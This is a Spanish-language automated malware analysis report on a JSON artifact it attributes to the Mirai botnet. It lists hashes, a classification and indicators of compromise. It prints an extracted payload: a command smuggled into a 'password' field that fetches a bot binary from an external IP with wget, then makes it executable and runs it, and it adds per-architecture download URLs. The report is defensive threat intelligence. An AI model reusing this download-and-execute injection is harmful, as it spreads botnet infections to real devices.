# 🧬 Payload Analysis

`34ef5cd158eb302207d2214e71212ca784f871ff16f2803f44d0b2b68c3b04ef`

## 📌 Resumen

Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos. Se identificó 1 comando observado o extraído. Se identificaron 11 indicadores técnicos.


## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai`
- **Confianza de familia:** `Media`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:10:14.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `34ef5cd158eb302207d2214e71212ca784f871ff16f2803f44d0b2b68c3b04ef`
- **SHA1:** `775e0df72123312cc1051628bfa4516156bffeba`
- **MD5:** `7fc867cd3b712aa8b9c5da31469d1a65`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | JSON text data |
| Tamaño | 869 B |
| Entropía | 4.82 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=JSON text data; iocs=10

## 🖥️ Comandos observados / extraídos

```text
{"password":"$(wget -q -O /tmp/bot_x86_64 hxxp://184.174.96.XXX:8114/bot.x86_64; chmod +x /tmp/bot_x86_64; /tmp/bot_x86_
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://184.174.96.XXX:8114/bot.x86_64; | strings |
| url | hxxp://184.174.96.XXX:8114/bot.armv5l; | strings |
| url | hxxp://184.174.96.XXX:8114/bot.mipsel; | strings |
| url | hxxp://184.174.96.XXX:8114/bot.mips; | strings |
| url | hxxp://184.174.96.XXX:8114/bot.armv7; | strings |
| url | hxxp://184.174.96.XXX:8114/bot.i386; | strings |
| url | hxxp://184.174.96.XXX:8114/bot.armv4; | strings |
| url | hxxp://184.174.96.XXX:8114/bot.armv6; | strings |
| ip | 184.174.96.XXX | static_analysis |
| command | {"password":"$(wget -q -O /tmp/bot_x86_64 hxxp://184.174.96.XXX:8114/bot.x86_64; chmod +x /tmp/bot_x86_64; /tmp/bot_x86_ | strings |
| hash | 34ef5cd158eb302207d2214e71212ca784f871ff16f2803f44d0b2b68c3b04ef | static_analysis |
| ip | 204.76.203.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
